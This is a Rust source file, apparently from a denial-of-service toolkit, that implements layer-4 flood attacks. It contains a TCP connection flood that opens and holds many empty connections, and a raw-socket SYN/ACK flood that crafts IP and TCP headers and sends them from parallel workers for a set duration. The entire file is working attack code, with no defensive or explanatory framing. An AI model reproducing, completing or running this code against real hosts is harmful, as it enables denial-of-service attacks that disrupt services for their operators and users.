use tokio::net::TcpStream;
use tokio::time::{Duration, Instant};
use std::net::Ipv4Addr;
use std::str::FromStr;
use socket2::{Socket, Domain, Type, Protocol};
use crate::modules::ddos::layer4::headers::{TcpHeader, Ipv4Header};
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;

// Variant 3: TCP Connection Flood (Empty Connection)
pub async fn connection_flood(target_ip: &str, target_port: u16, duration_secs: u64) {
    let start_time = Instant::now();
    let target = format!("{}:{}", target_ip, target_port);
    
    // Spawn massive amount of connections
    let mut handles = vec![];
    let max_concurrent = 200; // Limit per thread? No, per process.

    for _ in 0..10 { // 10 workers
        let target_clone = target.clone();
        handles.push(tokio::spawn(async move {
            let mut streams = Vec::new();
            while start_time.elapsed().as_secs() < duration_secs {
                if streams.len() < max_concurrent {
                    if let Ok(stream) = TcpStream::connect(&target_clone).await {
                         // Established. Keep alive.
                         // Don't read or write. Just hold.
                         streams.push(stream);
                    }
                }
                
                // Prune closed connections? 
                // We rely on timeout or OS to close them.
                // Just refilling up to max_concurrent.
                streams.retain(|_| true);
                
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        }));
    }
    
    for h in handles {
        let _ = h.await;
    }
}

// Variant 2 & 4: SYN / ACK Flood
pub async fn raw_flood(target_ip: &str, target_port: u16, duration_secs: u64, flag: &str) {
    let start_time = Instant::now();
    let target_ip_addr = Ipv4Addr::from_str(target_ip).unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
    let sockaddr = format!("{}:{}", target_ip, target_port).parse::<std::net::SocketAddr>().unwrap();

    // Create Raw Socket
    // Note: This requires Root/Admin.
    let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::TCP)) {
        Ok(s) => s,
        Err(e) => {
            println!("Failed to create Raw Socket (requires Root/Admin): {}", e);
            return;
        }
    };

    // We attempt to set IP_HDRINCL to provide full IP+TCP headers
    // This allows us to control the packet fully.
    if let Err(e) = socket.set_header_included_v4(true) {
        println!("Failed to set IP_HDRINCL: {}", e);
        // Continue anyway? Without HDRINCL, we only send TCP payload, kernel adds IP header.
        // But our code generates IP header. If we can't set HDRINCL, this might fail or send garbage.
        // We assume Root implies capability to set HDRINCL on Linux.
    }

    // Get Local IP for "Direct" attack (Non-spoofed)
    let local_ip = match std::net::UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => {
            if s.connect("8.8.8.8:80").is_ok() {
                if let Ok(addr) = s.local_addr() {
                    if let std::net::IpAddr::V4(ip) = addr.ip() {
                        ip
                    } else { Ipv4Addr::new(192, 168, 1, 100) }
                } else { Ipv4Addr::new(192, 168, 1, 100) }
            } else { Ipv4Addr::new(192, 168, 1, 100) }
        },
        Err(_) => Ipv4Addr::new(127, 0, 0, 1),
    };

    println!("Starting Raw TCP Flood ({}) on {} from Local IP: {}", flag, target_ip, local_ip);

    // Spawn workers
    let mut handles = vec![];
    
    for _ in 0..num_cpus::get() {
        let socket_clone = match socket.try_clone() {
            Ok(s) => s,
            Err(_) => continue,
        };
        let t_ip = target_ip_addr;
        let t_port = target_port;
        let flag_mode = flag.to_string();
        let src_ip_fixed = local_ip;
        
        handles.push(tokio::spawn(async move {
            let mut rng = StdRng::from_entropy();
            
            while start_time.elapsed().as_secs() < duration_secs {
                // Use Real Device IP (Non-spoofed)
                let rnd_src_port: u16 = rng.gen();
                
                // Build Headers
                let ip_header = Ipv4Header {
                    src: src_ip_fixed,
                    dst: t_ip,
                    protocol: 6, // TCP
                    id: rng.gen(),
                    ttl: 64,
                };
                
                let mut tcp_header = TcpHeader {
                    src_port: rnd_src_port,
                    dst_port: t_port,
                    seq: rng.gen(),
                    ack: if flag_mode.contains("ACK") { rng.gen() } else { 0 },
                    syn: flag_mode.contains("SYN"),
                    ack_flag: flag_mode.contains("ACK"),
                    psh: flag_mode.contains("PSH"),
                    rst: false,
                    fin: false,
                    win: 65535,
                };

                // Bytes
                // Total Len = 20 (IP) + 20 (TCP) = 40 (Empty Payload)
                let tcp_bytes = tcp_header.to_bytes(src_ip_fixed, t_ip);
                let ip_bytes = ip_header.to_bytes(40);
                
                let mut packet = Vec::with_capacity(40);
                packet.extend_from_slice(&ip_bytes);
                packet.extend_from_slice(&tcp_bytes);
                
                // Send
                // Since we use IP_HDRINCL, we send to the destination address.
                let _ = socket_clone.send_to(&packet, &sockaddr.into());
            }
        }));
    }
    
    for h in handles {
        let _ = h.await;
    }
}
